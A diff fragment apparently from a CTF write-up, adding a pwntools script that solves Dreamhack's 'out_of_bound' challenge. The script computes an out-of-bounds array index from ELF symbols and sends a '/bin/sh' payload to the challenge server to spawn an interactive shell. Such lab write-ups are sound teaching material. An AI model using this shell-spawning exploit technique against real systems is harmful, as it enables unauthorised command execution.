@@ -44,3 +44,25 @@ int main()
     return 0;
 }
 ```
+
+* 
+```sh
+from pwn import * 
+p = remote("host3.dreamhack.games", 21248)
+e=ELF("./out_of_bound")
+
+name_address= e.symbols['name']
+command_addr = e.symbols['command']
+
+idx = (name_address - command_addr) / 4    # Tính toán idx
+
+payload = p32(name_address + 4) + b'/bin/sh\x00'  
+
+p.sendafter(b"Admin name: ", payload)
+
+p.sendlineafter(b"What do you want?: ", str(idx).encode())
+
+p.interactive()
+```
+
+* <img width="433" height="443" alt="image" src="https://github.com/user-attachments/assets/7a4c7e05-3cc6-4ef5-a23a-3fbed1a704fc" />
